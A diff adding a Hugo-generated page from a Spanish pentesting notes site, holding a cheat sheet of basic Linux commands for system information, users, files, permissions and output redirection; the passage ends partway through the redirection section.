@@ -1,0 +1,1404 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Indice#Recolectar informacion Usuarios y grupos Operaciones con ficheros Permisos de ficheros Stdin, Stdout, Stderr Variables Concatenacion Búsqueda SSH Networking Compartir ficheros entre maquinas Comandos FTP Compresion/descompresion de ficheros Regex Recolectar información#* uname -r -a (system y kernel) * hostname * hostname -I (IP) * arp -a (tabla arp) * whoami (usuario actual) * id (grupo al que pertenece usuario actual) * ps -aux (procesos) * top (procesos en tiempo real) * bg (ver procesos en 2º plano) * pwd (ver directorio en el que estamos situados) * last (ultimos logins) * df -h (ver espacio libre en el sistema) * fdisk -l (ver particiones y tipos) usuarios y grupos#* groupadd [grupo] * adduser [usuario] * usermod [usuario] * -d [directorio] (especificar home) * -g [grupo] (especificar grupo) * -p [pass] (especificar contraseña) * -s [shell] (especificar la shell) * -m [directorio] (mover directorio home) (solo se puede usar con -d) Ficheros#* cd [directorio] (cambiar directorio) * ls [directorio] (listar directorio) * -l (formato largo) * -a (archivos ocultos) * -R (listado recursivo) * tree (ver arbol de ficheros) * mv [fichero] (mover, renombrar) * cp [fichero1] [fichero2] (copiar) * rm [fichero] (eliminar) * -r (recursivamente) * -f (forzar) * ln -s [fichero] [enlace] (link simbolico) Permisos en ficheros#* chmod 755 [fichero] (todos al propietario, leer al resto) * chown [usuario] [fichero] (cambiar propietario) * chown [usuario]:[grupo] [fichero] (cambiar propietario y grupo) * chgrp [grupo] [fichero] (cambiar grupo a un fichero) Stdin | Stdout | Stdr#0, hace referencia a la entrada (teclado) 1, hace referencia a la salida (pantalla) 2, hace referencia a la salida (errores)">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/5---hacking-linux/comandos-b%C3%A1sicos/">
+  <meta property="og:site_name" content="GlmbXecurity">
+  <meta property="og:title" content="GlmbXecurity">
+  <meta property="og:description" content="Indice#Recolectar informacion Usuarios y grupos Operaciones con ficheros Permisos de ficheros Stdin, Stdout, Stderr Variables Concatenacion Búsqueda SSH Networking Compartir ficheros entre maquinas Comandos FTP Compresion/descompresion de ficheros Regex Recolectar información#* uname -r -a (system y kernel) * hostname * hostname -I (IP) * arp -a (tabla arp) * whoami (usuario actual) * id (grupo al que pertenece usuario actual) * ps -aux (procesos) * top (procesos en tiempo real) * bg (ver procesos en 2º plano) * pwd (ver directorio en el que estamos situados) * last (ultimos logins) * df -h (ver espacio libre en el sistema) * fdisk -l (ver particiones y tipos) usuarios y grupos#* groupadd [grupo] * adduser [usuario] * usermod [usuario] * -d [directorio] (especificar home) * -g [grupo] (especificar grupo) * -p [pass] (especificar contraseña) * -s [shell] (especificar la shell) * -m [directorio] (mover directorio home) (solo se puede usar con -d) Ficheros#* cd [directorio] (cambiar directorio) * ls [directorio] (listar directorio) * -l (formato largo) * -a (archivos ocultos) * -R (listado recursivo) * tree (ver arbol de ficheros) * mv [fichero] (mover, renombrar) * cp [fichero1] [fichero2] (copiar) * rm [fichero] (eliminar) * -r (recursivamente) * -f (forzar) * ln -s [fichero] [enlace] (link simbolico) Permisos en ficheros#* chmod 755 [fichero] (todos al propietario, leer al resto) * chown [usuario] [fichero] (cambiar propietario) * chown [usuario]:[grupo] [fichero] (cambiar propietario y grupo) * chgrp [grupo] [fichero] (cambiar grupo a un fichero) Stdin | Stdout | Stdr#0, hace referencia a la entrada (teclado) 1, hace referencia a la salida (pantalla) 2, hace referencia a la salida (errores)">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+<title>Comandos Básicos | GlmbXecurity</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" >
+<link rel="stylesheet" href="/book.min.822ea23655b0ba1b461943a35514ae2c30663029973dea97b76d84fa6d10f821.css" integrity="sha256-gi6iNlWwuhtGGUOjVRSuLDBmMCmXPeqXt22E&#43;m0Q&#43;CE=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.053c47a53420d4d8f91a0d7ff16baf41deb7e3c08baea451fd3e10effc18b34b.js" integrity="sha256-BTxHpTQg1Nj5Gg1/8WuvQd6348CLrqRR/T4Q7/wYs0s=" crossorigin="anonymous"></script>
+
+  
+
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>GlmbXecurity</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4725ecd4288801edac599d317b7f3fbd" class="toggle"  />
+    <label for="section-4725ecd4288801edac599d317b7f3fbd" class="flex justify-between">
+      <a href="/docs/1---reconocimiento/" class="">Reconocimiento</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/busqueda-de-exploits/" class="">Busqueda De Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/descubrir-equipos-en-la-red/" class="">Descubrir Equipos en La Red</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/dominios-y-emails/" class="">Dominios Y Emails</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/google-dorks-cheatsheet/" class="">Google Dorks Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/nmap/" class="">Nmap</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/reconocimiento-web/" class="">Reconocimiento Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/version-de-servicio-y-s.o/" class="">Version De Servicio Y S. O</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/waf/" class="">Waf</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-113277fae8d94cf467d477245d42c6e9" class="toggle"  />
+    <label for="section-113277fae8d94cf467d477245d42c6e9" class="flex justify-between">
+      <a href="/docs/3---hacking-web/" class="">Hacking web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/anotaciones-varias/" class="">Anotaciones Varias</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/bypass-subir-ficheros-con-extensiones-no-permitidas/" class="">Bypass Subir Ficheros Con Extensiones No Permitidas</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/descubrimiento-cms/" class="">Descubrimiento Cms</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/drupal/" class="">Drupal</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/enumeraci%C3%B3n-web-avanzada/" class="">Enumeración Web Avanzada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/fuerza-bruta-login-web/" class="">Fuerza Bruta Login Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/fuzzing-web/" class="">Fuzzing Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/lfi/" class="">Lfi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/vulnerabilidad-target-blank/" class="">Vulnerabilidad Target Blank</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/webdav/" class="">Web Dav</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/wordpress/" class="">Wordpress</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/xss/" class="">Xss</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6d708dbd650445c961ea376c6ec392a3" class="toggle"  />
+    <label for="section-6d708dbd650445c961ea376c6ec392a3" class="flex justify-between">
+      <a href="/docs/2---hacking-gen%C3%A9rico/" class="">Hacking Genérico</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/codificaci%C3%B3n/" class="">Codificación</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/cracking-fuerza-bruta/" class="">Cracking Fuerza Bruta</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/esteganograf%C3%ADa/" class="">Esteganografía</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/local-port-forwarding/" class="">Local Port Forwarding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/metasploit-y-msfvenom/" class="">Metasploit Y Msf Venom</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/obfuscation---av-evasion/" class="">Obfuscation Av Evasion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/repositorio-git/" class="">Repositorio Git</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/reverse-shells/" class="">Reverse Shells</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/wireshark/" class="">Wireshark</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-653fb6148147fb5a54d5ae8f6cdc32db" class="toggle"  />
+    <label for="section-653fb6148147fb5a54d5ae8f6cdc32db" class="flex justify-between">
+      <a href="/docs/4---hacking-servicios/" class="">Hacking Servicios</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/111-rcpbind-nfs/" class="">111 RCP Bind ( Nfs)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/139-445-smb/" class="">139, 445 Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/161-snmp/" class="">161 SNMP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/21-ftp/" class="">21 FTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/22-ssh/" class="">22 SSH</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/25-smtp/" class="">25 SMTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/3306-sql/" class="">3306 SQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/3389-rdp/" class="">3389 Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/5985-winrm/" class="">5985 Win Rm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/8080-apache-tomcat/" class="">8080 Apache Tomcat</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4702fb46d9830af28f7b5deb2ce3e3da" class="toggle" checked />
+    <label for="section-4702fb46d9830af28f7b5deb2ce3e3da" class="flex justify-between">
+      <a href="/docs/5---hacking-linux/" class="">Hacking Linux</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/comandos-b%C3%A1sicos/" class="active">Comandos Básicos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/crack-etc-shadow/" class="">Crack Etc Shadow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/escalada-privilegios/" class="">Escalada Privilegios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/escribir-en-terminal-de-una-v%C3%ADctima/" class="">Escribir en Terminal De Una Víctima</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/path-hijacking/" class="">Path Hijacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/pivoting-de-usuarios/" class="">Pivoting De Usuarios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/tratamiento-de-la-tty/" class="">Tratamiento De La Tty</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-bad90e32cc0f7a46aaa4431b64839fc0" class="toggle"  />
+    <label for="section-bad90e32cc0f7a46aaa4431b64839fc0" class="flex justify-between">
+      <a href="/docs/6---hacking-windows/" class="">Hacking Windows</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/comandos-b%C3%A1sicos/" class="">Comandos Básicos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/enumeracion/" class="">Enumeracion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/escalada-privilegios/" class="">Escalada Privilegios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/explotacion/" class="">Explotacion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/vulnerabilidades-mas-conocidas/" class="">Vulnerabilidades Mas Conocidas</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c0791bead2c829c6f4d4cc85517e0210" class="toggle"  />
+    <label for="section-c0791bead2c829c6f4d4cc85517e0210" class="flex justify-between">
+      <a href="/docs/7---proyectos/" class="">Proyectos</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/certification-authority-&#43;-acme/" class="">Certification Authority Acme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/personalizar-kali-con-bspwm/" class="">Personalizar Kali Con Bspwm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/servidor-git-&#43;-web-apuntes-con-obsidian/" class="">Servidor Git Web Apuntes Con Obsidian</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/servidor-vpn-privado-&#43;-pihole/" class="">Servidor VPN Privado Pi Hole</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/vaultwarden-password-manager/" class="">Vaultwarden Password Manager</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/links-de-inter%C3%A9s/" class="">Links De Interés</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/preparacion-ejpt-v2/" class="">Preparacion Ejpt V2</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Comandos Básicos</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#indice">Indice</a></li>
+        <li><a href="#recolectar-información">Recolectar información</a></li>
+        <li><a href="#usuarios-y-grupos">usuarios y grupos</a></li>
+        <li><a href="#ficheros">Ficheros</a></li>
+        <li><a href="#permisos-en-ficheros">Permisos en ficheros</a></li>
+        <li><a href="#stdin--stdout--stdr">Stdin | Stdout | Stdr</a></li>
+        <li><a href="#variables-bash-y-alias">Variables Bash y alias</a></li>
+        <li><a href="#concatenacion">Concatenacion</a></li>
+        <li><a href="#búsqueda">Búsqueda</a></li>
+        <li><a href="#compresion-ficheros">Compresion ficheros</a></li>
+        <li><a href="#conexion-ssh">conexion SSH</a></li>
+        <li><a href="#networking">Networking</a></li>
+        <li><a href="#compartir-ficheros-entre-maquinas">Compartir ficheros entre maquinas</a></li>
+        <li><a href="#ftp">FTP</a></li>
+        <li><a href="#compresiondescompresion-de-ficheros">Compresion/Descompresion de ficheros</a></li>
+        <li><a href="#regex-expresiones-regulares">Regex (Expresiones regulares)</a></li>
+        <li><a href="#sql">SQL</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h3 id="indice">
+  Indice
+  <a class="anchor" href="#indice">#</a>
+</h3>
+<ul>
+<li><a href="#recolectar">Recolectar informacion</a></li>
+<li><a href="#usuarios_grupos">Usuarios y grupos</a></li>
+<li><a href="#ficheros">Operaciones con ficheros</a></li>
+<li><a href="#ficheross">Permisos de ficheros</a></li>
+<li><a href="#stdin">Stdin, Stdout, Stderr</a></li>
+<li><a href="#var">Variables</a></li>
+<li><a href="#concat">Concatenacion</a></li>
+<li><a href="#bus">Búsqueda</a></li>
+<li><a href="#ssh">SSH</a></li>
+<li><a href="#net">Networking</a></li>
+<li><a href="#comp">Compartir ficheros entre maquinas</a></li>
+<li><a href="#ftp">Comandos FTP</a></li>
+<li><a href="#tar">Compresion/descompresion de ficheros</a></li>
+<li><a href="#regex">Regex</a></li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="recolectar-información">
+  Recolectar información
+  <a class="anchor" href="#recolectar-informaci%c3%b3n">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* uname -r -a <span style="color:#f92672">(</span>system y kernel<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* hostname
+</span></span><span style="display:flex;"><span>* hostname -I <span style="color:#f92672">(</span>IP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* arp -a <span style="color:#f92672">(</span>tabla arp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* whoami <span style="color:#f92672">(</span>usuario actual<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* id <span style="color:#f92672">(</span>grupo al que pertenece usuario actual<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* ps -aux <span style="color:#f92672">(</span>procesos<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* top <span style="color:#f92672">(</span>procesos en tiempo real<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* bg <span style="color:#f92672">(</span>ver procesos en 2º plano<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* pwd <span style="color:#f92672">(</span>ver directorio en el que estamos situados<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* last <span style="color:#f92672">(</span>ultimos logins<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* df -h <span style="color:#f92672">(</span>ver espacio libre en el sistema<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* fdisk -l <span style="color:#f92672">(</span>ver particiones y tipos<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="usuarios-y-grupos">
+  usuarios y grupos
+  <a class="anchor" href="#usuarios-y-grupos">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* groupadd <span style="color:#f92672">[</span>grupo<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>* adduser <span style="color:#f92672">[</span>usuario<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>* usermod <span style="color:#f92672">[</span>usuario<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  * -d <span style="color:#f92672">[</span>directorio<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>especificar home<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -g <span style="color:#f92672">[</span>grupo<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>especificar grupo<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -p <span style="color:#f92672">[</span>pass<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>especificar contraseña<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -s <span style="color:#f92672">[</span>shell<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>especificar la shell<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -m <span style="color:#f92672">[</span>directorio<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>mover directorio home<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>solo se puede usar con -d<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="ficheros">
+  Ficheros
+  <a class="anchor" href="#ficheros">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* cd <span style="color:#f92672">[</span>directorio<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>cambiar directorio<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* ls <span style="color:#f92672">[</span>directorio<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>listar directorio<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -l <span style="color:#f92672">(</span>formato largo<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -a <span style="color:#f92672">(</span>archivos ocultos<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -R <span style="color:#f92672">(</span>listado recursivo<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* tree <span style="color:#f92672">(</span>ver arbol de ficheros<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* mv <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>mover, renombrar<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* cp <span style="color:#f92672">[</span>fichero1<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>fichero2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>copiar<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* rm <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>eliminar<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -r <span style="color:#f92672">(</span>recursivamente<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -f <span style="color:#f92672">(</span>forzar<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* ln -s <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>enlace<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>link simbolico<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="permisos-en-ficheros">
+  Permisos en ficheros
+  <a class="anchor" href="#permisos-en-ficheros">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* chmod <span style="color:#ae81ff">755</span> <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>todos al propietario, leer al resto<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* chown <span style="color:#f92672">[</span>usuario<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>cambiar propietario<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* chown <span style="color:#f92672">[</span>usuario<span style="color:#f92672">]</span>:<span style="color:#f92672">[</span>grupo<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>cambiar propietario y grupo<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* chgrp <span style="color:#f92672">[</span>grupo<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>cambiar grupo a un fichero<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="stdin--stdout--stdr">
+  Stdin | Stdout | Stdr
+  <a class="anchor" href="#stdin--stdout--stdr">#</a>
+</h3>
+<p>0, hace referencia a la entrada (teclado)
+1, hace referencia a la salida (pantalla)
+2, hace referencia a la salida (errores)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* <span style="color:#f92672">[</span>comando<span style="color:#f92672">]</span> 2&gt;/dev/null <span style="color:#f92672">(</span>enviar errores a dev/null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* <span style="color:#f92672">[</span>comando <span style="color:#f92672">]</span>&amp;&gt;/dev/null <span style="color:#f92672">(</span>enviar todo a dev/null, tanto salida como errores<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* <span style="color:#f92672">[</span>comando2<span style="color:#f92672">]</span> &gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>enviar errores a pantalla <span style="color:#f92672">[</span>cuando se ejecuta programa en segundo plano<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>* <span style="color:#f92672">[</span>comando<span style="color:#f92672">]</span> &amp; <span style="color:#f92672">(</span>ejecutar en 2º plano<span style="color:#f92672">)</span>
